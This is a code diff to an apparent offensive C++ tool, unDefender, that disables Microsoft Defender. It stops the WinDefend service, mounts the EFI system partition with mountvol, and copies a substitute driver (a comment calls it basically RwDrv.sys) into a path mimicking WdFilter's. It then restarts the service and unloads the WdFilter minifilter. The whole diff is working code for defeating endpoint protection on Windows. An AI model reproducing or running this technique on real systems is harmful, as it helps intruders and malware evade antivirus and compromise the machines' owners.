@@ -127,9 +127,20 @@ NTSTATUS ImpersonateAndUnload()
 		std::cout << "[-] Couldn't stop WinDefend service...\n";
 		return 1;
 	}
-	else std::cout << "[+] Successfully stopped the WinDefend service! Proceeding to restart it...\n";
+	else std::cout << "[+] Successfully stopped the WinDefend service! Sleeping 5 seconds...\n";
 
-	Sleep(10000);
+	Sleep(5000);
+
+	// YES I KNOW IT'S SLOPPY BUT IT'S 5 AM AND THIS IS FAST.
+	// make sure to put in the same folder unDefender.exe AND the provided WdFilter.sys (which is basically RwDrv.sys :)
+	// this command sequence mounts the UEFI partition and creates a directory tree structure which mimicks the legit WdFilter path
+	system("mountvol.exe U: /S");
+	std::cout << "[!] ";
+	system("mkdir U:\\Windows\\System32\\Drivers\\wd\\");
+	std::cout << "[!] ";
+	system("copy .\\legit.sys U:\\Windows\\System32\\Drivers\\wd\\WdFilter.sys /Y");
+	//std::cout << "[!] ";
+	system("mountvol.exe U: /D");
 
 	success = StartServiceW(winDefendSvc.GetHandle(), 0, nullptr);
 	if (!success)
@@ -138,7 +149,9 @@ NTSTATUS ImpersonateAndUnload()
 		std::cout << "[-] Couldn't restart WinDefend service...\n";
 		return 1;
 	}
-	else std::cout << "[+] Successfully restarted the WinDefend service!\n";
+	else std::cout << "[+] Successfully restarted the WinDefend service! Sleeping 5 seconds...\n";
+
+	Sleep(5000);
 
 	UNICODE_STRING wdfilterDrivServ;
 	RtlInitUnicodeString(&wdfilterDrivServ, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");
@@ -150,6 +163,8 @@ NTSTATUS ImpersonateAndUnload()
 		Error(RtlNtStatusToDosError(status));
 		std::cout << "[-] Failed to unload Wdfilter...\n";
 	}
+
+	
 #pragma endregion Wdfilter is unloaded
 	return status;
 }
